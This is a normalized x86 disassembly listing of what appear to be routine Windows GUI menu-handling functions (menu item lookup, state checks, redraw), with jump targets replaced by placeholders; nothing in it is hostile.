test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_4566bc
mov eax ebx
call sub_45b294
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_456700
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_4207e4
sub_45b26c
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_45b26c
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_4583bc
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_45ad00
mov eax ebx
pop esi
pop ebx
retn
sub_45b2a8
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c3f4
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_404568
sub_45b2d8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_4040a0
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_45b35c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45b47e
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_4042c8
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_4042c8
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_404528
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404414
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b485
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40402c
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_4045b0
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_404388
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_4042c8
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_404528
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_404388
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_45b4bc
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_45b95b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4040a0
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45b91c
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_45a8fc
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_4040a0
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b962
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_40402c
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_40402c
lea eax [ ebp - 0x18 ]
call sub_404008
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax ebx
call sub_45bb10
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_45a90c
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404414
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_45b2d8
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_45a90c
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45a90c
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403290
mov eax [ ebp - 0x20 ]
call sub_403290
mov eax [ ebp - 0x14 ]
call sub_403290
mov eax [ ebp - 0xc ]
call sub_403290
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_45b2d8
pop ecx
mov eax [ ebp - 0x30 ]
call sub_4042c8
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_45a90c
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_45d3b4
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407d48
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_40405c
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c3f4
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c3f4
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_45a90c
push eax
mov edx esi
mov eax ebx
call sub_45a90c
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_404528
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407d48
push ebp
mov eax [ ebp - 0x2c ]
call sub_45b2a8
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_45b2a8
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c3f4
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_4040a0
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_45a90c
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_45a90c
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_45d320
mov edx [ ebp - 0x40 ]
pop eax
call sub_40405c
mov edx esi
mov eax ebx
call sub_45a90c
push eax
mov edx esi
mov eax ebx
call sub_45a90c
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_4042c8
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_404528
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_45b35c
mov eax [ ebp - 0x18 ]
call sub_4042c8
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_404568
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_4045b0
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_45b35c
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_45b9b8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_45a8fc
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_45a8fc
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45bb3c
test al al
je r-xdata
mov eax esi
call sub_45a8fc
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_45a90c
call sub_45b994
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_45a90c
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_45a90c
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_45a90c
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_45a90c
call sub_45b994
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_45a90c
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_45a90c
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_45a90c
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_45a90c
call sub_45b994
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_45bb10
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_45bb10
and eax 0x7f
mov al [ eax + rw-data ]
sub_45bb3c
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_45bb3c
and eax 0x7f
mov al [ eax + rw-data ]
sub_45bb68
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_458850
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_420714
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_45c894
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_45bc04
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403290
mov eax [ esi + 0x44 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420760
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_45bc78
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_45bc78
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_4583bc
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_45ad00
mov eax ebx
pop esi
pop ebx
retn
sub_45bcb8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_45a8fc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_45a90c
call sub_45bcb8
pop ecx
test al al
je r-xdata
sub_45bd50
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_45bcb8
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_4583bc
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_45bd80
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_45bd50
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_45d0a4
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_45bdf0
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_45bd50
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_45be0c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_45bd50
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_45b4bc
mov ebx eax
xor edx edx
mov eax edi
call sub_45b9b8
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_45ae24
mov eax [ esi + 0x34 ]
call sub_45ae24
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_458d60
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_44f2dc
push eax
call DrawMenuBar
sub_45bef8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_45bef8
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_45c01d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_45bd50
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_45ae24
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_45bee8
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_45c04c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4294a4
xor eax eax
push ebp
push sub_45c14a
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4294a4
xor eax eax
push ebp
push sub_45c11f
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_45bef8
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_42949c
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c151
mov eax [ rw-data ]
call sub_42949c
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_45bd50
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_45c170
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_45c4f4
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_45c4f4
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_45c22c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_45c7c8
mov eax ebx
call sub_408650
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_45c2cc
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_45c22c
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_404278
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_4044c8
lea edx [ ebp - 0x200 ]
call sub_408714
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_45c360
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_45c3d0
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
